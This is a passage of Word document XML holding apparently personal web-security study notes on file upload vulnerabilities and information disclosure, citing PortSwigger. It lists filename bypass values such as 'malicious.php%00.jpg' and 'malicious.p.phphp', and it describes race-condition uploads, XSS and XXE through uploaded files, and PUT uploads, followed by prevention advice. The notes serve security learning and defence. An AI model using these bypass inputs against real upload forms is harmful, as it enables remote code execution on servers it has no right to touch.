      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php_module</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> /usr/lib/apache2/modules/libphp.so</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>AddTyp</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> application/x-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>httpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Obfuscation of file extension</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Cause the server to execute a file with a different extension:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Altered case: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>malicious.pHp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Double file </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>extenstion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>malicious.php.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">URL encoded file extension: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>malicious%2Ephp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Null byte or semicolon to terminate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>malicious.php%00.jpg</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>malicious.php;.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unicode encoding: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>malicious%u002ephp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Buried file extension, which will be stripped by the server: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>malicious.p.phphp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Flawed validation of file contents</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Servers may try to determ</w:t>
      </w:r>
      <w:r>
        <w:t>ine file contents by checking properties of the files:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Image file dimensions; or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Expected byte sequences in the file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">However, these can be faked with something like </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ExifTool</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Upload race conditions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Relies on the attac</w:t>
      </w:r>
      <w:r>
        <w:t>ker uploading and attempting to execute the malicious file before the file server can scan and determine the file is malicious.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">This can also be </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>perfomed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> by file upload that accepts a file URL.  The attacker can attempt to lengthen the amount of time they </w:t>
      </w:r>
      <w:r>
        <w:t>have for an attack by putting the attack payload at the beginning of the file and then padding the upload with arbitrary data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Exploits without server-side execution</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: upload a file that is consumed by other users (e.g. profile picture) and attacks the </w:t>
      </w:r>
      <w:r>
        <w:t>other user's account.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>XXE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: if the file accepts XML based uploads, you can attempt </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attackes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> through files like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.doc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>xls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> files.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Upload via PUT</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Some servers will accept file uploads through </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requests that are not as rigorously validated as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:bulb</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">: You can use an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>OPTIONS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request to check if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is supported.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Validate the file type, size, and content.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use an established file upload framework.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Randomise</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the file name and location.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Do not allow directory traversal </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">characters </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the filename.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Only move files to the server's permanent file system once they have been validated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Determine the safe max file size that can be uploaded.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Deny execution of all files by default and then safe-list specific file types that can be execute</w:t>
      </w:r>
      <w:r>
        <w:t>d.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">IP rate limit on file uploads to prevent </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId13" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Proxy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId14" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ExifTool</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/file-upload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Information </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>disclosure :eye</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>When a website or service leaks information about:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>it's users (PII);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>sensitive commercial or business data; or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>technical</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> d</w:t>
      </w:r>
      <w:r>
        <w:t>etails about the service infrastructure.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>This can then allow the attacker to cause harm to the users, business or service itself (through exploiting known vulnerabilities with the infrastructure).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Examples</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Revealing names and structure of hidden directorie</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Gaining access to backups and sensitive files.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Error messages providing too much technical detail to the user.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Exposing highly sensitive information, like credit cards, in the application logs or GUI.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Hard-coded credentials in source code.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>'Fingerprinti</w:t>
      </w:r>
      <w:r>
        <w:t>ng' the hosting platform by through server headers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Determining underlying existence/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>absense</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> of resources by observing differences between responses.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Techniques</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Information disclosure can be triggered and detected by:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Fuzzing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: sending a large number of </w:t>
      </w:r>
      <w:r>
        <w:t>requests with varying inputs to see how the application behaves.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Scanning</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: using a tool like </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Burp Scanner</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> to test for and identify information leakage during browsing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>Causing errors</w:t>
      </w:r>
      <w:r>
        <w:t>: attem</w:t>
      </w:r>
      <w:r>
        <w:t>pting to cause error conditions in the application to see what information is revealed in the error messages.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sources of information disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Web crawler files like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>sitemap.yml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> which can reveal hidden directories.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Web server automatic </w:t>
      </w:r>
      <w:r>
        <w:t>directory listings (poorly configured web servers can reveal hidden directories).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Developer </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>commesn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> in source code</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Error messages providing too much information</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Debug data in the response</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>User account pages with poor authorization controls</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Backup files whi</w:t>
      </w:r>
      <w:r>
        <w:t>ch can leak the application source code</w:t>
      </w:r>
    </w:p>
